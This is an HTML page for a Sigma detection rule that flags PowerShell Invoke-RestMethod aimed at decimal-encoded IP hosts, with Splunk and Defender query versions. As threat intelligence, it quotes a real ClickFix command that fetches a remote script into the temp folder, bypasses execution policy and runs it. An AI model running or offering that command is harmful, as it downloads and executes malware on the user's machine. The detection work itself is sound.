@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PowerShell Invoke-RestMethod To Decimal-Encoded IP Host · eeps-sigma</title>
+<meta name="description" content="Detects a command line in which PowerShell&#x27;s Invoke-RestMethod (alias irm) targets a host written as a single decimal integer instead of a dotted IPv4 address (8 to 10 digits, the range of a decimal-encoded IPv4 address), e.g. &quot;irm 1614733393/12&quot;.">
+<meta property="og:title" content="PowerShell Invoke-RestMethod To Decimal-Encoded IP Host · eeps-sigma">
+<meta property="og:description" content="Detects a command line in which PowerShell&#x27;s Invoke-RestMethod (alias irm) targets a host written as a single decimal integer instead of a dotted IPv4 address (8 to 10 digits, the range of a decimal-encoded IPv4 address), e.g. &quot;irm 1614733393/12&quot;.">
+<meta name="author" content="Esmond Er">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+<script>try{var t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;}catch(_){}</script>
+</head>
+<body>
+<header class="nav">
+  <div class="wrap nav-in">
+    <a class="brand" href="../index.html"><span class="mark" aria-hidden="true">Σ</span>eeps-sigma</a>
+    <nav>
+      <a href="../index.html#rules">Rules</a>
+      <a href="../index.html#approach">Approach</a>
+      <a href="../index.html#about">About</a>
+      <a href="https://github.com/aienthues/eeps-sigma" rel="noopener">GitHub</a>
+      <button class="theme" type="button" aria-label="Toggle colour theme" data-theme-toggle><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 3a9 9 0 0 0 0 18z" fill="currentColor"/></svg></button>
+    </nav>
+  </div>
+</header>
+<main>
+
+<section class="rule-hero">
+  <div class="wrap">
+    <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#rules">Rules</a><span>/</span><span>Windows</span><span>/</span><span>process creation</span></nav>
+    <h1>PowerShell Invoke-RestMethod To Decimal-Encoded IP Host</h1>
+    <div class="badges"><span class="lvl lvl-high">High</span><span class="pill">Experimental</span><span class="pill">Windows · process creation</span></div>
+    <div class="cta">
+      <a class="btn" href="https://raw.githubusercontent.com/aienthues/eeps-sigma/main/rules/windows/process_creation/proc_creation_win_powershell_irm_decimal_ip_host.yml" download>Download .yml</a>
+      <a class="btn btn-ghost" href="https://github.com/aienthues/eeps-sigma/blob/main/rules/windows/process_creation/proc_creation_win_powershell_irm_decimal_ip_host.yml" rel="noopener">View on GitHub</a>
+    </div>
+  </div>
+</section>
+
+<div class="wrap rule-grid">
+  <article class="rule-main">
+    <section>
+      <h2>What it detects</h2>
+      <p>Detects a command line in which PowerShell&#x27;s Invoke-RestMethod (alias irm) targets a host written as a single decimal integer instead of a dotted IPv4 address (8 to 10 digits, the range of a decimal-encoded IPv4 address), e.g. &quot;irm 1614733393/12&quot;.</p>
+    </section>
+    <section><h2>Why this rule exists</h2><p>Huntress reports an unattributed ClickFix campaign in which the pasted command was PowerShell.exe -ExecutionPolicy Bypass &quot;irm 1614733393/12 | Out-File $env:temp\1777.ps1;&amp; $env:temp\1777.ps1&quot;, noting that the host is written as a decimal number rather than a dotted IP.</p><p>SigmaHQ &quot;Obfuscated IP Download Activity&quot; matches the reported sample only via its octal clause, because the leading digits happen to be 0-7; it does not match decimal hosts generally.</p><p>SigmaHQ &quot;Suspicious Invoke-WebRequest Execution With DirectIP&quot; requires &#x27;://&#x27; in the command line.</p></section>
+    <section>
+      <h2>Detection logic</h2>
+      <div class="tabs" role="tablist"><button type="button" role="tab" class="tab on" data-tab="0" aria-selected="true">Sigma</button><button type="button" role="tab" class="tab" data-tab="1" aria-selected="false">Splunk SPL</button><button type="button" role="tab" class="tab" data-tab="2" aria-selected="false">KQL · Defender XDR</button></div>
+      <div class="pane" data-pane="0"><div class="code-meta"><span>Rule source</span><button type="button" class="copy" data-copy>Copy</button></div><pre class="code"><code><span class="y-key">title</span>: PowerShell Invoke-RestMethod To Decimal-Encoded IP Host
+<span class="y-key">id</span>: 76bcdcf4-a8aa-4e4b-9d23-51c30e7528ba
+<span class="y-key">status</span>: experimental
+<span class="y-key">description</span>: |
+    Detects a command line in which PowerShell&#x27;s Invoke-RestMethod (alias irm) targets a host written as a single decimal integer instead of a dotted IPv4 address
+    (8 to 10 digits, the range of a decimal-encoded IPv4 address), e.g. <span class="y-str">&quot;irm 1614733393/12&quot;</span>.
+    Huntress reports an unattributed ClickFix campaign in which the pasted command was
+    PowerShell.exe -ExecutionPolicy Bypass <span class="y-str">&quot;irm 1614733393/12 | Out-File $env:temp\1777.ps1;&amp; $env:temp\1777.ps1&quot;</span>, noting that the host is written as a decimal number rather than a dotted IP.
+    SigmaHQ <span class="y-str">&quot;Obfuscated IP Download Activity&quot;</span> matches the reported sample only via its octal clause, because the leading digits happen to be 0-7; it does not match decimal hosts generally.
+    SigmaHQ <span class="y-str">&quot;Suspicious Invoke-WebRequest Execution With DirectIP&quot;</span> requires <span class="y-str">&#x27;://&#x27;</span> in the command line.
+<span class="y-key">references</span>:
+<span class="y-dash">    -</span> https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
+<span class="y-key">author</span>: Esmond Er
+<span class="y-key">date</span>: 2026-10-01
+<span class="y-key">modified</span>: 2026-10-01
+<span class="y-key">tags</span>:
+<span class="y-dash">    -</span> attack.command-and-control
+<span class="y-dash">    -</span> attack.t1105
+<span class="y-dash">    -</span> attack.execution
+<span class="y-dash">    -</span> attack.t1059.001
+<span class="y-key">logsource</span>:
+    <span class="y-key">category</span>: process_creation
+    <span class="y-key">product</span>: windows
+<span class="y-key">detection</span>:
+    <span class="y-key">selection</span>:
+        <span class="y-key">CommandLine</span><span class="y-mod">|re|i</span>: <span class="y-str">&#x27;\b(irm|Invoke-RestMethod)\s+(https?://)?[0-9]{8,10}([/:\s&quot;&#x27;</span><span class="y-str">&#x27;]|$)&#x27;</span>
+    <span class="y-key">condition</span>: selection
+<span class="y-key">falsepositives</span>:
+<span class="y-dash">    -</span> Scripts that pass an 8 to 10 digit number as the first positional argument of Invoke-RestMethod (unusual, since that argument is the URI)
+<span class="y-key">level</span>: high</code></pre></div><div class="pane" data-pane="1" hidden><div class="code-meta"><span>Sysmon + Splunk Windows field mapping</span><button type="button" class="copy" data-copy>Copy</button></div><pre class="code"><code>source=&quot;WinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=1
+| regex CommandLine=&quot;(?i)\\b(irm|Invoke-RestMethod)\\s+(https?://)?[0-9]{8,10}([/:\\s\&quot;&#x27;]|$)&quot;</code></pre></div><div class="pane" data-pane="2" hidden><div class="code-meta"><span>Microsoft Defender XDR advanced hunting</span><button type="button" class="copy" data-copy>Copy</button></div><pre class="code"><code>DeviceProcessEvents
+| where ProcessCommandLine matches regex &quot;(?i)\\b(irm|Invoke-RestMethod)\\s+(https?://)?[0-9]{8,10}([/:\\s\&quot;&#x27;]|$)&quot;</code></pre></div>
+      <p class="muted small">Backend queries are generated with pySigma as a starting point. Field names and index or table names depend on your environment; verify before deploying.</p>
+    </section>
+    <section>
+      <h2>False positives &amp; tuning</h2>
+      <ul class="bullets"><li>Scripts that pass an 8 to 10 digit number as the first positional argument of Invoke-RestMethod (unusual, since that argument is the URI)</li></ul>
+    </section>
+  </article>
+
+  <aside class="rule-side">
+    <div class="panel">
+      <h3>ATT&amp;CK</h3>
+      <div class="tac"><span class="chip chip-soft">Command and Control</span> <span class="chip chip-soft">Execution</span></div>
+      <ul class="plain"><li><a href="https://attack.mitre.org/techniques/T1105/" rel="noopener"><span class="chip">T1105</span></a> Ingress Tool Transfer</li><li><a href="https://attack.mitre.org/techniques/T1059/001/" rel="noopener"><span class="chip">T1059.001</span></a> Command and Scripting Interpreter: PowerShell</li></ul>
+    </div>
+    <div class="panel">
+      <h3>Log source</h3>
+      <dl class="kv"><div><dt>Category</dt><dd>process_creation</dd></div><div><dt>Product</dt><dd>windows</dd></div></dl>
+    </div>
+    <div class="panel">
+      <h3>Source intelligence</h3>
+      <ul class="plain refs"><li><a href="https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat" rel="noopener">huntress.com</a><span class="muted small ref-url">https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat</span></li></ul>
+    </div>
+    <div class="panel">
+      <h3>Metadata</h3>
+      <dl class="kv">
+        <div><dt>Rule ID</dt><dd class="mono">76bcdcf4-a8aa-4e4b-9d23-51c30e7528ba</dd></div>
+        <div><dt>Created</dt><dd>2026-10-01</dd></div>
+        <div><dt>Modified</dt><dd>2026-10-01</dd></div>
+        <div><dt>Author</dt><dd>Esmond Er</dd></div>
+      </dl>
+    </div>
+    
+  </aside>
+</div>
+
+</main>
+<footer class="foot">
+  <div class="wrap foot-in">
+    <div>
+      <strong>eeps-sigma</strong> · by Esmond Er<br>
+      <span class="muted">Rules released under the <a href="https://github.com/aienthues/eeps-sigma/blob/main/LICENSE.md">Detection Rule License 1.1</a>. Experimental rules: test and tune in your environment before production use.</span>
+    </div>
+    <p class="muted small">Research triage and first drafts are AI-assisted. Every rule is traced to a primary source, passes automated schema, compile and ATT&amp;CK checks, and is independently reviewed before it is published here.</p>
+  </div>
+</footer>
+<script src="../assets/site.js"></script>
+</body>
+</html>
